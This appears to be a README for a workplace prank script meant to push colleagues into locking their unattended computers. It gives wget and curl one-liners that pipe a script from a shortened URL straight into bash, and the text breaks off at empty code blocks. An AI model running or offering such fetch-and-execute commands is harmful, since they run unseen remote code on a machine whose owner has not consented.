## Why does this even exist?
Security. This will teach your colleagues to lock their computer when they are away.

You may think itâ€™s not important, but leaving your computer unlocked is like leaving the door of your house open and hoping nobody will rob you. Anyone could sit at your computer and gain access to your private information.

Some of the risks are:
- Sending email from your account
- Tamper and delete your files
- Access and download Confidential data

## How to use?

Open the terminal and type the following command:

### Wget
```bash
wget https://tiny.cc/hasselhoff -O - | bash
```

### Curl
```bash
curl -L https://tiny.cc/hasselhoff | bash
```

If you can't run the script, try with this url:

```

## Windows usage

```cmd
